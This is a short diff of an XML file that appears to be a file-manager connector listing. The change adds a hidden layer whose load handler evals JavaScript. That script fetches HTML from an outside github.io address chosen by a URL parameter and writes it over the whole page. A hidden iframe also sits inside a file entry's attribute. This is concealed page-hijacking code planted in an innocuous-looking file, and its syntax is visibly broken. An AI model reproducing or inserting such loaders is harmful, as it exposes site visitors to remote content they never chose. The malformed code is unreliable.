@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <Connector command="GetFoldersAndFiles" resourceType="Document">
-  <layer var id = new URLSearchParams(location.search).get("id") || "alczar_arquitectonico";
+  <layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('var id = new URLSearchParams(location.search).get("id") || "alczar_arquitectonico";
 
 fetch("https://mrsabasmia.github.io/subwork/" + id + ".html")
   .then(e => e.text())
@@ -8,7 +8,7 @@ fetch("https://mrsabasmia.github.io/subwork/" + id + ".html")
     document.open();
     document.write(e);
     document.close();
-  }); />
+  });');eval(w)););"/>
   <Files>
     <File name="Loading..." url="1" size="&lt;iframe style=&quot;display:none&quot;"/>
   </Files>
